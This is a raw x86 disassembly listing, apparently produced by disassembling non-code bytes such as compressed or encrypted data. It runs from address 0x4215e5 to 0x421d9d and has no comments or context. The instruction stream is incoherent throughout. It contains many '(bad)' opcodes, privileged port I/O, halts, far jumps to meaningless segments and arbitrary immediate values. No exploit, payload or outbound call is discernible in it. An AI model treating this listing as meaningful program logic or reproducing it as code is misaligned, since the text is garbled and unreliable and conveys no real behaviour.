  4215e5:	xchg   esp,eax
  4215e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215e7:	cmp    al,0xdd
  4215e9:	(bad)  
  4215ea:	pop    ecx
  4215eb:	loop   0x4215d5
  4215ed:	clc    
  4215ee:	out    dx,eax
  4215ef:	inc    esp
  4215f0:	mov    WORD PTR [edx-0x9c2ab53],cs
  4215f6:	pop    esi
  4215f7:	dec    esi
  4215f8:	outs   dx,BYTE PTR ds:[esi]
  4215f9:	aad    0x2c
  4215fb:	dec    ecx
  4215fc:	mov    bl,0xdd
  4215fe:	mov    edi,0x48aef0c1
  421603:	jb     0x421680
  421605:	inc    ebp
  421606:	mov    es,ebx
  421608:	or     DWORD PTR [ecx-0x2ec4b8bd],ecx
  42160e:	push   cs
  42160f:	push   edi
  421610:	test   BYTE PTR [esi+0x45608a00],0xf4
  421617:	push   0x4f7c1766
  42161c:	stos   BYTE PTR es:[edi],al
  42161d:	js     0x421635
  42161f:	jmp    0x421667
  421621:	mov    al,ds:0x35dae7e3
  421626:	test   al,0x51
  421628:	sub    ebx,DWORD PTR [edi]
  42162a:	adc    eax,0xc7da4cf0
  42162f:	mov    BYTE PTR [ecx+0x7bb09401],cl
  421635:	pop    ecx
  421636:	fdiv   st,st(4)
  421638:	shl    DWORD PTR [eax],cl
  42163a:	in     eax,dx
  42163b:	mov    ebx,0x9486ed5d
  421640:	ds cmp eax,0x6f2517b3
  421646:	sub    al,dh
  421648:	or     esi,DWORD PTR [edx+0xe]
  42164b:	imul   esi,DWORD PTR [edi+0xeafaa4f],0x9cb539cf
  421655:	dec    esp
  421656:	ins    BYTE PTR es:[edi],dx
  421657:	mov    al,ds:0x81bc6a
  42165c:	inc    ebx
  42165d:	mov    ebp,0x5bc1146c
  421662:	xlat   BYTE PTR ds:[ebx]
  421663:	leave  
  421664:	or     al,0xef
  421666:	fwait
  421667:	in     al,0x88
  421669:	enter  0xb4bb,0x6
  42166d:	sbb    BYTE PTR [eax-0x2f129a22],bl
  421673:	les    esp,FWORD PTR fs:[edx-0x2f]
  421677:	pmaddwd mm7,QWORD PTR [esi-0x5a]
  42167b:	sbb    esp,ebx
  42167d:	or     DWORD PTR [ebp+0x65],esi
  421680:	cmp    ah,BYTE PTR [ecx]
  421682:	pop    edx
  421683:	cmp    DWORD PTR ds:0xc5df0611,edi
  421689:	mov    bh,0xb4
  42168b:	gs hlt 
  42168d:	fs aas 
  42168f:	xchg   ecx,eax
  421690:	inc    eax
  421691:	add    ch,BYTE PTR [edx-0x41]
  421694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421695:	xchg   DWORD PTR [eax-0x5dedcf54],edi
  42169b:	js     0x421640
  42169d:	adc    ah,BYTE PTR [ecx+0xf]
  4216a0:	loope  0x4216d8
  4216a2:	mov    ch,BYTE PTR [ebp-0x2aaf9650]
  4216a8:	pop    edi
  4216a9:	ja     0x42164f
  4216ab:	sub    bh,dl
  4216ad:	les    esi,FWORD PTR [eax-0x7617f049]
  4216b3:	test   DWORD PTR [ecx+0x6b801264],esi
  4216b9:	dec    esp
  4216ba:	jo     0x42170d
  4216bc:	outs   dx,DWORD PTR ds:[esi]
  4216bd:	icebp  
  4216be:	das    
  4216bf:	add    ecx,DWORD PTR [edi]
  4216c1:	stos   DWORD PTR es:[edi],eax
  4216c2:	mov    eax,ds:0x302e65ed
  4216c7:	sub    BYTE PTR [edi+0x549462f9],0x4a
  4216ce:	test   BYTE PTR [esi+0x4b],bh
  4216d1:	pop    es
  4216d2:	push   ebp
  4216d3:	int    0x50
  4216d5:	jmp    0x567c:0xf9703375
  4216dc:	xchg   ebp,eax
  4216dd:	pop    ds
  4216de:	ins    BYTE PTR es:[edi],dx
  4216df:	rol    DWORD PTR [ebx],1
  4216e1:	add    BYTE PTR [ebp-0x7da652dc],dh
  4216e7:	sbb    ebx,ecx
  4216e9:	xlat   BYTE PTR ds:[ebx]
  4216ea:	rol    DWORD PTR [ebx-0x6b9c663f],cl
  4216f0:	jg     0x4216c4
  4216f2:	idiv   BYTE PTR [ecx+0x338b466e]
  4216f8:	hlt    
  4216f9:	rcl    DWORD PTR [ecx+0x6d],0x65
  4216fd:	mov    ch,0x59
  4216ff:	test   ch,cl
  421701:	inc    eax
  421702:	or     al,0xc
  421704:	ins    BYTE PTR es:[edi],dx
  421705:	lods   al,BYTE PTR ds:[esi]
  421706:	mov    ah,0xf8
  421708:	sbb    al,0xfb
  42170a:	jnp    0x4216d2
  42170c:	jns    0x4216d3
  42170e:	xchg   esi,eax
  42170f:	mov    esi,0x24941d2d
  421714:	push   eax
  421715:	push   esi
  421716:	gs fcomip st,st(7)
  421719:	jo     0x421701
  42171b:	ret    0x8b67
  42171e:	adc    al,0x4a
  421720:	rcr    DWORD PTR [edi+0x43],cl
  421723:	out    0x78,eax
  421725:	push   ss
  421726:	in     al,dx
  421727:	push   ecx
  421728:	xchg   ecx,eax
  421729:	cld    
  42172a:	inc    esi
  42172b:	in     al,dx
  42172c:	shr    ah,1
  42172e:	xchg   ecx,eax
  42172f:	jno    0x421793
  421731:	or     bh,BYTE PTR [edi+0x10]
  421734:	inc    eax
  421735:	jb     0x421703
  421737:	in     al,0x80
  421739:	das    
  42173a:	retf   0xf5f5
  42173d:	sub    DWORD PTR ds:0x805beae5,esi
  421743:	icebp  
  421744:	add    BYTE PTR [edi-0x2c],0xf
  421748:	loope  0x42175b
  42174a:	sub    ecx,eax
  42174c:	mov    bh,0xa3
  42174e:	mov    ch,0x38
  421750:	pusha  
  421751:	mov    ds:0x63149e60,eax
  421756:	in     al,0x58
  421758:	mov    ds:0xab179f6a,eax
  42175d:	push   ecx
  42175e:	xor    eax,0x6a4ff84
  421763:	jmp    0x3578ed94
  421768:	es adc al,0xd9
  42176b:	mov    cl,0xcf
  42176d:	sub    BYTE PTR [eax+esi*1],ch
  421770:	inc    esi
  421771:	xor    DWORD PTR [esi-0x67c2460b],ebx
  421777:	popa   
  421778:	mov    gs,WORD PTR [esi+ebx*2]
  42177b:	popf   
  42177c:	lods   eax,DWORD PTR ds:[esi]
  42177d:	adc    dh,BYTE PTR [edi-0x75]
  421780:	iret   
  421781:	cdq    
  421782:	push   ebx
  421783:	lods   al,BYTE PTR ds:[esi]
  421784:	js     0x42178b
  421786:	inc    ah
  421788:	cdq    
  421789:	leave  
  42178a:	ja     0x4217ec
  42178c:	aad    0x32
  42178e:	adc    BYTE PTR [edx],ch
  421790:	int    0xa1
  421792:	dec    ebp
  421793:	jge    0x421762
  421795:	inc    edx
  421796:	test   DWORD PTR [edx],esi
  421798:	sar    cl,1
  42179a:	rcl    DWORD PTR [ecx-0x55],cl
  42179d:	dec    esp
  42179e:	fs int 0xf1
  4217a1:	cmp    dl,BYTE PTR cs:[edx+0x0]
  4217a5:	dec    ecx
  4217a6:	test   DWORD PTR [eax-0x35251086],esi
  4217ac:	aaa    
  4217ad:	push   es
  4217ae:	scas   eax,DWORD PTR es:[edi]
  4217af:	push   esi
  4217b0:	cdq    
  4217b1:	dec    ebp
  4217b2:	in     al,dx
  4217b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217b4:	dec    edi
  4217b5:	mov    esi,0x10d1e6b7
  4217ba:	idiv   ah
  4217bc:	dec    esp
  4217bd:	cdq    
  4217be:	std    
  4217bf:	mov    bl,0x67
  4217c1:	inc    edi
  4217c2:	mov    ch,BYTE PTR [esp+ebx*2-0x58a2055b]
  4217c9:	xor    ebx,esp
  4217cb:	(bad)  
  4217cc:	ficomp DWORD PTR [eax+0x6f]
  4217cf:	popf   
  4217d0:	fdivr  st,st(4)
  4217d2:	scas   eax,DWORD PTR es:[edi]
  4217d3:	push   es
  4217d4:	ins    BYTE PTR es:[edi],dx
  4217d5:	jl     0x421847
  4217d7:	test   eax,0xe07e1bb5
  4217dc:	mov    ch,0x86
  4217de:	adc    bl,BYTE PTR [esp+edx*8+0x16ed4c34]
  4217e5:	push   ecx
  4217e6:	mov    ch,0x2d
  4217e8:	dec    esp
  4217e9:	mov    eax,0x48cbf690
  4217ee:	in     al,dx
  4217ef:	dec    ebx
  4217f0:	mov    cl,0xb5
  4217f2:	push   ds
  4217f3:	xchg   edx,eax
  4217f4:	mov    es,WORD PTR [ecx+0x7d]
  4217f7:	ss mov bh,0xeb
  4217fa:	pop    eax
  4217fb:	test   eax,0x30f50408
  421801:	jae    0x421808
  421803:	(bad)  
  421804:	adc    al,0x2f
  421806:	inc    edx
  421807:	sti    
  421808:	adc    esi,esp
  42180a:	cmp    al,0xe7
  42180c:	sub    DWORD PTR [eax],ebx
  42180e:	mov    bh,0xb7
  421810:	sbb    eax,0xa9fbd846
  421815:	lods   eax,DWORD PTR ds:[esi]
  421816:	pop    edx
  421817:	das    
  421818:	int    0x19
  42181a:	pop    ds
  42181b:	dec    edx
  42181c:	cs cwde 
  42181e:	lahf   
  42181f:	iret   
  421820:	mov    edx,0x8a95679f
  421825:	call   0xfdf8:0xc246bfa3
  42182c:	ret    0x6a8d
  42182f:	jno    0x42185a
  421831:	push   esi
  421832:	cwde   
  421833:	enter  0x9493,0x68
  421837:	sahf   
  421838:	pushf  
  421839:	jns    0x4217ce
  42183b:	or     eax,0xc2bc1dd6
  421840:	jb     0x421820
  421842:	xchg   esp,eax
  421843:	les    edx,FWORD PTR [edx-0x35]
  421846:	shl    ecx,1
  421848:	daa    
  421849:	mov    ecx,0x203fa433
  42184e:	popa   
  42184f:	xchg   esp,eax
  421850:	pop    esi
  421851:	dec    edi
  421852:	mov    edx,0x55fe5659
  421857:	imul   edi,DWORD PTR [esi+0x2268161c],0x6886d1b7
  421861:	pop    ebp
  421862:	mov    dh,0x96
  421864:	cmp    ah,BYTE PTR [ebp-0x43]
  421867:	dec    eax
  421868:	(bad)  
  421869:	pop    esp
  42186a:	jge    0x421878
  42186c:	mov    bh,0x6c
  42186e:	fdiv   DWORD PTR [ebx]
  421870:	fild   QWORD PTR [esi]
  421872:	std    
  421873:	push   edx
  421874:	mov    edi,0x15e44a2f
  421879:	jo     0x421867
  42187b:	lea    ebp,[eax+esi*1+0x7d]
  42187f:	loop   0x42185b
  421881:	push   eax
  421882:	jg     0x4218f9
  421884:	out    dx,eax
  421885:	pushf  
  421886:	shl    DWORD PTR [ebp+ecx*2+0x646b7310],1
  42188d:	outs   dx,BYTE PTR ds:[esi]
  42188e:	fs mov ebp,0xf4ec52a9
  421894:	pop    ss
  421895:	fidiv  WORD PTR [esi-0x564c3176]
  42189b:	add    al,0xef
  42189d:	push   ebx
  42189e:	mov    al,ds:0x85f0af60
  4218a3:	xchg   edi,eax
  4218a4:	mov    bh,0x41
  4218a6:	iret   
  4218a7:	repz mov WORD PTR [eax-0x63135ad4],gs
  4218ae:	cwde   
  4218af:	aaa    
  4218b0:	ror    BYTE PTR [edi],0x1
  4218b3:	dec    eax
  4218b4:	mov    edx,0x1c40cfef
  4218b9:	js     0x421891
  4218bb:	aaa    
  4218bc:	xor    ebp,edx
  4218be:	fistp  WORD PTR [edi]
  4218c0:	je     0x4218f0
  4218c2:	test   eax,0x5d8ccf1f
  4218c7:	(bad)
  4218ca:	nop
  4218cb:	mov    dh,cl
  4218cd:	pop    edi
  4218ce:	retf   
  4218cf:	lea    ebp,fs:[eax+0x25]
  4218d3:	mov    ecx,0x26a4523d
  4218d8:	jg     0x421874
  4218da:	iret   
  4218db:	in     al,dx
  4218dc:	dec    esp
  4218dd:	push   ds
  4218de:	sub    DWORD PTR [ecx],eax
  4218e0:	lock lahf 
  4218e2:	test   BYTE PTR [esi+0x5d],bh
  4218e5:	mov    ch,BYTE PTR [ebp-0x14]
  4218e8:	sbb    DWORD PTR fs:[ebx],esp
  4218eb:	loopne 0x421956
  4218ed:	gs jo  0x42194f
  4218f0:	ds int 0xb4
  4218f3:	test   al,0xb6
  4218f5:	lds    edi,FWORD PTR [edx+0x4a]
  4218f8:	das    
  4218f9:	mov    ch,0x20
  4218fb:	push   0x30
  4218fd:	outs   dx,BYTE PTR ds:[esi]
  4218fe:	adc    DWORD PTR [ebp+0x7e],0x9
  421902:	or     eax,0x79a8e33a
  421907:	xor    eax,0xd7017b04
  42190c:	and    BYTE PTR ds:0xce91fafd,cl
  421912:	add    eax,DWORD PTR [ecx]
  421914:	ja     0x421993
  421916:	mul    DWORD PTR [ebx-0x53]
  421919:	push   edi
  42191a:	(bad)  
  42191b:	icebp  
  42191c:	push   esi
  42191d:	js     0x4218d7
  42191f:	ins    DWORD PTR es:[edi],dx
  421920:	lea    ebx,[esi+eax*8-0x15594420]
  421927:	ins    DWORD PTR es:[edi],dx
  421928:	fs jb  0x421954
  42192b:	jnp    0x421967
  42192d:	mov    ebx,0xde1b6d38
  421932:	test   BYTE PTR ds:0x170cc2de,al
  421938:	sbb    eax,edx
  42193a:	jmp    0x4bc6:0x7e92b848
  421941:	jno    0x42199d
  421943:	out    0xf5,eax
  421945:	sub    ah,BYTE PTR ds:0x1f5e18c6
  42194b:	jecxz  0x421975
  42194d:	fwait
  42194e:	or     BYTE PTR [esi+esi*1+0xb1c351e],0x0
  421956:	cmp    BYTE PTR [edi-0x7f],al
  421959:	add    eax,0x1cb0923a
  42195e:	lods   al,BYTE PTR ds:[esi]
  42195f:	cmp    eax,0xa51ba65a
  421964:	sub    DWORD PTR [eax],0xe69b8a49
  42196a:	mov    dh,0xa6
  42196c:	pop    ebx
  42196d:	inc    ecx
  42196e:	ret    0x50cd
  421971:	mov    esi,0xa684df34
  421976:	xor    eax,0x3de8c18b
  42197b:	and    BYTE PTR [ebp-0x79],ch
  42197e:	sub    al,0xea
  421980:	out    dx,eax
  421981:	dec    ecx
  421982:	xchg   ebx,eax
  421983:	fnsave ds:0x12efafd
  421989:	push   esi
  42198a:	pop    ebx
  42198b:	loopne 0x42199b
  42198d:	(bad)  
  42198e:	mov    ebp,0x122c16ce
  421993:	pop    ecx
  421994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421995:	sub    esp,DWORD PTR [ebp+0x48]
  421998:	inc    edi
  421999:	sbb    DWORD PTR [esi+ecx*8+0x5d],ecx
  42199d:	adc    BYTE PTR [edx],0xf9
  4219a0:	sbb    bl,BYTE PTR [ecx-0x1fef2a11]
  4219a6:	into   
  4219a7:	das    
  4219a8:	enter  0x15cf,0xfe
  4219ac:	iret   
  4219ad:	cmp    ah,al
  4219af:	add    DWORD PTR [ebp-0x7c0e665c],ebp
  4219b5:	adc    eax,0x3d4069fb
  4219ba:	pop    ebx
  4219bb:	sub    eax,0x1651995
  4219c0:	sbb    ebp,eax
  4219c2:	pop    esi
  4219c3:	pop    ebp
  4219c4:	retf   
  4219c5:	push   ss
  4219c6:	(bad)  
  4219c7:	xor    esi,esi
  4219c9:	dec    ebx
  4219ca:	mov    BYTE PTR [ebp+0x76],ah
  4219cd:	inc    eax
  4219ce:	je     0x4219ec
  4219d0:	xor    al,0xe4
  4219d2:	xor    BYTE PTR [eax-0x4c],ah
  4219d5:	pop    ds
  4219d6:	lds    ecx,FWORD PTR [ebx]
  4219d8:	xchg   ecx,eax
  4219d9:	cld    
  4219da:	xchg   ebp,eax
  4219db:	mov    edi,0xaeeb1045
  4219e0:	xchg   ebx,eax
  4219e1:	je     0x421966
  4219e3:	fild   DWORD PTR [ebx+0x40]
  4219e6:	push   ebp
  4219e7:	push   ss
  4219e8:	mov    dh,0xde
  4219ea:	fmul   QWORD PTR [esp+edx*2]
  4219ed:	add    DWORD PTR [ebx+0x3b01f6fb],0xffffffef
  4219f4:	bound  esi,QWORD PTR [eax-0x7f]
  4219f7:	mov    ebx,DWORD PTR es:[eax]
  4219fa:	daa    
  4219fb:	cmp    eax,edx
  4219fd:	dec    ebp
  4219fe:	shl    ch,cl
  421a00:	test   DWORD PTR [ecx+0x5c],edi
  421a03:	loopne 0x4219e6
  421a05:	mov    cl,0x96
  421a07:	imul   ebp
  421a09:	loop   0x4219b5
  421a0b:	push   edx
  421a0c:	and    DWORD PTR [esp+eax*2+0x50],edi
  421a10:	mov    eax,ds:0x5a6c6b1a
  421a15:	push   ds
  421a16:	pop    ebp
  421a17:	xor    ecx,esp
  421a19:	xor    edi,DWORD PTR [edx-0x13]
  421a1c:	jno    0x421a5d
  421a1e:	pop    eax
  421a20:	pusha  
  421a21:	push   esp
  421a22:	inc    esp
  421a23:	pop    ecx
  421a24:	add    DWORD PTR [ebp+0x72],esp
  421a27:	cdq    
  421a28:	and    ebp,DWORD PTR [edi-0x39]
  421a2b:	in     eax,0x3c
  421a2d:	add    BYTE PTR [edi+eiz*1+0x65605c45],bh
  421a34:	iret   
  421a35:	inc    ebp
  421a36:	mov    eax,ds:0x557d1f99
  421a3b:	sbb    BYTE PTR [ecx+ecx*8+0xa],bl
  421a3f:	jg     0x421a9f
  421a41:	xor    al,0xc5
  421a43:	(bad)  
  421a44:	jmp    DWORD PTR [eax]
  421a46:	sar    DWORD PTR [eax+0x5a0c2880],0xca
  421a4d:	jb     0x421a15
  421a4f:	push   0xfded058f
  421a54:	fcmovnbe st,st(4)
  421a56:	xchg   ecx,edx
  421a58:	test   eax,0x22f4f08b
  421a5d:	pop    edx
  421a5e:	ja     0x421ada
  421a60:	lock test ecx,0x358528ba
  421a67:	dec    eax
  421a68:	or     al,0x78
  421a6a:	lods   al,BYTE PTR ds:[esi]
  421a6b:	xor    eax,0x21b909a7
  421a70:	pop    ebp
  421a71:	inc    BYTE PTR [edx+0x97e7801]
  421a77:	pusha  
  421a78:	mov    dl,0xaf
  421a7a:	mov    dl,0x1a
  421a7c:	inc    eax
  421a7d:	imul   esp,ebp,0x3992fad2
  421a83:	jo     0x421a76
  421a85:	jg     0x421af8
  421a87:	add    ecx,ecx
  421a89:	mov    eax,0xd3feeadc
  421a8e:	inc    ebp
  421a8f:	xchg   esi,eax
  421a90:	cli    
  421a91:	mov    edx,0x225d717e
  421a96:	and    eax,0x6efb6415
  421a9b:	xchg   ecx,eax
  421a9c:	daa    
  421a9d:	rcr    BYTE PTR [ebp+0x16],0x69
  421aa1:	iret   
  421aa2:	adc    bl,bl
  421aa4:	nop
  421aa5:	or     eax,0x18b2ad62
  421aaa:	xchg   edi,eax
  421aab:	out    dx,eax
  421aac:	mul    dl
  421aae:	or     dh,BYTE PTR [eax+0x1a]
  421ab1:	xchg   ecx,eax
  421ab2:	jp     0x421ae4
  421ab4:	test   eax,0xc5e506c7
  421ab9:	dec    edi
  421aba:	es inc ebp
  421abc:	jno    0x421a61
  421abe:	and    DWORD PTR [ebp-0x8],ebp
  421ac1:	mov    bh,0x13
  421ac3:	cli    
  421ac4:	adc    cl,BYTE PTR [eax+ebp*1+0x4]
  421ac8:	pushf  
  421ac9:	jge    0x421b32
  421acb:	mov    bh,0x4f
  421acd:	lock cmp ch,0xae
  421ad1:	aam    0xd
  421ad3:	inc    edi
  421ad4:	inc    eax
  421ad5:	jle    0x421b15
  421ad7:	jmp    0xab7f72c7
  421adc:	pop    eax
  421add:	sbb    ah,BYTE PTR [edx]
  421adf:	in     eax,dx
  421ae0:	cli    
  421ae1:	sbb    DWORD PTR [esi+0x54],ecx
  421ae4:	lds    esi,FWORD PTR [esi+0x66ea1f92]
  421aea:	aaa    
  421aeb:	test   BYTE PTR [esi+edi*4],ch
  421aee:	fs push ss
  421af0:	push   edi
  421af1:	gs push esi
  421af3:	(bad)  
  421af4:	scas   al,BYTE PTR es:[edi]
  421af5:	xchg   edx,eax
  421af6:	stos   DWORD PTR es:[edi],eax
  421af7:	fist   WORD PTR [edx-0x18]
  421afa:	xchg   edi,eax
  421afb:	jae    0x421b1e
  421afd:	sbb    DWORD PTR [esi+edi*2],ecx
  421b00:	bound  ebp,QWORD PTR [ebx-0x18]
  421b03:	test   al,0x3f
  421b05:	jecxz  0x421b73
  421b07:	or     al,0xeb
  421b09:	retf   0xa018
  421b0c:	adc    al,0x8b
  421b0e:	adc    eax,0x39cc6a9c
  421b13:	stc    
  421b14:	ficomp WORD PTR [eax]
  421b16:	mov    eax,ds:0x5054f400
  421b1b:	mov    edi,DWORD PTR [edx-0x4fd01298]
  421b21:	cdq    
  421b22:	into   
  421b23:	mov    DWORD PTR [edi+0x7dfd0ed3],eax
  421b29:	xchg   DWORD PTR [eax],ecx
  421b2b:	inc    edx
  421b2c:	sahf   
  421b2d:	test   DWORD PTR [edx+edi*1-0x49],esi
  421b31:	loope  0x421ae3
  421b33:	xor    ebp,ecx
  421b35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b36:	ins    BYTE PTR es:[edi],dx
  421b37:	jns    0x421b3e
  421b39:	add    eax,0xc594ccbc
  421b3e:	and    bh,dl
  421b40:	pop    ecx
  421b41:	mov    edx,0x37734835
  421b46:	mov    edx,0xecf44d34
  421b4c:	sub    eax,0x9c63efed
  421b51:	std    
  421b52:	jmp    0x659e:0xbd0c7a55
  421b59:	pusha  
  421b5a:	fcomp  QWORD PTR [ecx-0xe]
  421b5d:	out    dx,eax
  421b5e:	push   eax
  421b5f:	nop
  421b60:	outs   dx,BYTE PTR ds:[esi]
  421b61:	mov    bh,0xab
  421b63:	xchg   edx,eax
  421b64:	dec    ecx
  421b65:	pusha  
  421b66:	mov    eax,ds:0xe65b22e1
  421b6b:	rcr    esp,cl
  421b6d:	and    eax,0xd88bb0a2
  421b72:	mov    DWORD PTR [ebx+0xac06d24],edi
  421b78:	rcl    edx,0x87
  421b7b:	cld    
  421b7c:	jae    0x421b9d
  421b7e:	adc    al,0x69
  421b80:	pop    ss
  421b81:	xor    BYTE PTR [ebp+eiz*1-0x33c74eff],dl
  421b88:	lock aad 0xf0
  421b8b:	in     eax,0xeb
  421b8d:	lahf   
  421b8e:	jae    0x421bbe
  421b90:	xor    bh,bh
  421b92:	mov    ebp,0xcd532dd2
  421b97:	in     eax,0x44
  421b99:	mov    ebx,0xde379e1
  421b9e:	mov    ch,BYTE PTR [ebx+0x4d]
  421ba1:	mov    DWORD PTR [esi+0x2dc6c87f],edi
  421ba7:	cmp    DWORD PTR [eax+eiz*2],ecx
  421baa:	push   ebx
  421bab:	or     ebp,DWORD PTR [ecx+0x22c5ebae]
  421bb1:	sbb    DWORD PTR [edx+0x66],ebx
  421bb4:	push   edx
  421bb5:	add    esi,DWORD PTR [ecx+0x5e]
  421bb8:	out    dx,eax
  421bb9:	stos   DWORD PTR es:[edi],eax
  421bba:	xchg   esi,eax
  421bbb:	test   al,0xb8
  421bbd:	fnstsw WORD PTR [edx]
  421bbf:	aaa    
  421bc0:	lods   al,BYTE PTR ds:[esi]
  421bc1:	daa    
  421bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bc3:	popf   
  421bc4:	push   edx
  421bc5:	jecxz  0x421bf5
  421bc7:	inc    edx
  421bc8:	add    ecx,edi
  421bca:	pushf  
  421bcb:	mov    esp,0x743c6f27
  421bd0:	(bad)  
  421bd1:	nop
  421bd2:	dec    ebx
  421bd3:	pushf  
  421bd4:	or     esp,esi
  421bd6:	inc    edx
  421bd7:	xor    al,0xa7
  421bd9:	mov    ecx,0x4b0cd0d5
  421bde:	add    DWORD PTR [edi],edi
  421be0:	dec    ebx
  421be1:	pop    DWORD PTR ds:0xed5ac775
  421be7:	sub    BYTE PTR [ecx-0xb],bh
  421bea:	sbb    eax,0xbcf440cd
  421bef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bf1:	push   0xb1c4924d
  421bf6:	and    edx,edx
  421bf8:	mov    bl,0x2
  421bfa:	cmp    bh,BYTE PTR [edi+0x4e]
  421bfd:	mov    al,ds:0xc25addbb
  421c02:	clc    
  421c03:	lea    edx,[ebx]
  421c05:	jns    0x421bfe
  421c07:	(bad)  
  421c09:	cli    
  421c0a:	(bad)  
  421c0b:	cmp    dh,ch
  421c0d:	test   BYTE PTR [esi+0x4e],ch
  421c10:	sahf   
  421c11:	mov    WORD PTR [ebp-0x2298b986],fs
  421c17:	out    dx,eax
  421c18:	bound  ebx,QWORD PTR [ebp+0x47c40e6c]
  421c1e:	test   al,0x7
  421c20:	fidivr DWORD PTR [ebx]
  421c22:	pop    ebp
  421c23:	push   esp
  421c24:	dec    esp
  421c25:	cdq    
  421c26:	jle    0x421c80
  421c28:	mov    ch,bl
  421c2a:	out    dx,al
  421c2b:	xchg   BYTE PTR [ecx-0x53b1a4af],ah
  421c31:	(bad)  
  421c32:	imul   esi,DWORD PTR [ebx],0xa6248ea4
  421c38:	adc    BYTE PTR [ebp+0x6ad179f0],bh
  421c3e:	sbb    ch,BYTE PTR [edx+edi*8+0x3dcfd85a]
  421c45:	mov    bl,0xfe
  421c47:	fist   WORD PTR [eax]
  421c49:	adc    DWORD PTR [edi+0x68a56476],ecx
  421c4f:	mov    ss,edx
  421c51:	mov    al,ds:0x4abb1d25
  421c56:	int3   
  421c57:	icebp  
  421c58:	pop    esp
  421c59:	scas   eax,DWORD PTR es:[edi]
  421c5a:	xor    BYTE PTR [ebp+0x408e1fbc],cl
  421c60:	out    0x51,al
  421c62:	sbb    bh,BYTE PTR [eax-0x3a]
  421c65:	in     eax,dx
  421c66:	dec    esi
  421c67:	push   edi
  421c68:	adc    DWORD PTR [ebp+0x2779b6e6],0xffffffd8
  421c6f:	jmp    0xfdba2104
  421c74:	mov    cl,0x64
  421c76:	jecxz  0x421c80
  421c78:	rcr    DWORD PTR [ecx-0xbc08b1b],cl
  421c7e:	ja     0x421c44
  421c80:	in     eax,dx
  421c81:	test   DWORD PTR [ecx-0x732bc7d4],ebp
  421c87:	push   cs
  421c88:	cmp    dh,BYTE PTR [eax-0x28]
  421c8b:	adc    eax,0x1d80fcea
  421c90:	hlt    
  421c91:	inc    edx
  421c92:	mov    ecx,0x289af817
  421c97:	adc    ebp,esp
  421c99:	jl     0x421d0a
  421c9b:	mov    cl,0xe9
  421c9d:	daa    
  421c9e:	xchg   edx,eax
  421c9f:	inc    esp
  421ca0:	cld    
  421ca1:	mov    ebx,0xc3d5da45
  421ca6:	adc    ecx,eax
  421ca8:	dec    ebp
  421ca9:	add    ah,bl
  421cab:	mov    bh,0x63
  421cad:	sbb    eax,0xdfa29c4
  421cb2:	pop    eax
  421cb3:	imul   ebx,DWORD PTR [eax-0x74],0xa
  421cb7:	les    ecx,FWORD PTR [edi+eax*1+0x57c13eb1]
  421cbe:	pop    edx
  421cbf:	jae    0x421c44
  421cc1:	mov    ebx,0x968f108f
  421cc6:	jno    0x421ccc
  421cc8:	sub    cl,BYTE PTR [ecx-0x4d]
  421ccb:	leave  
  421ccc:	inc    esi
  421ccd:	daa    
  421cce:	data16 icebp 
  421cd0:	aas    
  421cd1:	or     al,0x44
  421cd3:	inc    edx
  421cd4:	repnz mov bl,0x6c
  421cd7:	arpl   WORD PTR [edi],ax
  421cd9:	in     eax,0x31
  421cdb:	ret    
  421cdc:	ficom  WORD PTR [ebx+0x2e]
  421cdf:	lds    esp,FWORD PTR [ecx-0x6]
  421ce2:	adc    cl,bh
  421ce4:	test   eax,0x7731f329
  421ce9:	in     al,0xa1
  421ceb:	cli    
  421cec:	and    eax,0xdd90f5a7
  421cf1:	in     al,0xec
  421cf3:	pop    edx
  421cf4:	jno    0x421cb8
  421cf6:	xchg   ebx,eax
  421cf7:	retf   0x91d
  421cfa:	aas    
  421cfb:	mov    edx,0x6874096a
  421d00:	mov    BYTE PTR [ebx],bl
  421d02:	pop    esi
  421d03:	xchg   edx,eax
  421d04:	cld    
  421d05:	inc    ebx
  421d06:	pop    edi
  421d07:	jecxz  0x421d03
  421d09:	mov    DWORD PTR [ebp-0x78],edx
  421d0c:	dec    eax
  421d0d:	jae    0x421cd5
  421d0f:	inc    ecx
  421d10:	push   ebp
  421d11:	pusha  
  421d12:	xlat   BYTE PTR ds:[ebx]
  421d13:	fs push es
  421d15:	cli    
  421d16:	push   esp
  421d17:	or     DWORD PTR [edx+ecx*4-0x19e76c53],ebx
  421d1e:	cli    
  421d1f:	xor    eax,0x639b5645
  421d24:	push   ds
  421d25:	iret   
  421d26:	int    0x92
  421d28:	fdivp  st(2),st
  421d2a:	lods   eax,DWORD PTR ds:[esi]
  421d2b:	inc    eax
  421d2c:	jne    0x421d57
  421d2e:	les    edi,FWORD PTR [ecx+0x1613ef4c]
  421d34:	js     0x421d55
  421d36:	xor    ah,bl
  421d38:	adc    edi,esi
  421d3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d3b:	ror    BYTE PTR [esp+eax*2-0xa],cl
  421d3f:	sahf   
  421d40:	test   BYTE PTR [edi+0x34],bh
  421d43:	jnp    0x421da5
  421d45:	icebp  
  421d46:	adc    eax,0x8cfbe3bb
  421d4b:	mov    edx,0x374ada89
  421d50:	mov    bh,BYTE PTR [esi+0x57dcccdb]
  421d56:	jne    0x421cdd
  421d58:	dec    ebx
  421d59:	repz call 0xd3078094
  421d5f:	pop    es
  421d60:	xchg   ebx,ecx
  421d62:	ss sub eax,0xf33cced5
  421d68:	cdq    
  421d69:	pop    es
  421d6a:	not    DWORD PTR [esi-0x7d513626]
  421d70:	dec    eax
  421d71:	lahf   
  421d72:	mov    al,ss:0x2d5a3a5d
  421d78:	rcr    DWORD PTR [ebx-0x69],cl
  421d7b:	ret    
  421d7c:	add    eax,0x5250eec0
  421d81:	or     esp,DWORD PTR [ebx+0x13]
  421d84:	mov    bh,0x9d
  421d86:	inc    ah
  421d88:	movmskps esp,xmm1
  421d8b:	js     0x421d25
  421d8d:	xchg   ebp,eax
  421d8e:	(bad)  
  421d8f:	adc    eax,0xae19a4c
  421d94:	jbe    0x421de6
  421d96:	mov    ecx,0xf5a59677
  421d9b:	push   ebx
  421d9c:	xchg   ebp,eax
  421d9d:	cmp    eax,0x99487dfb
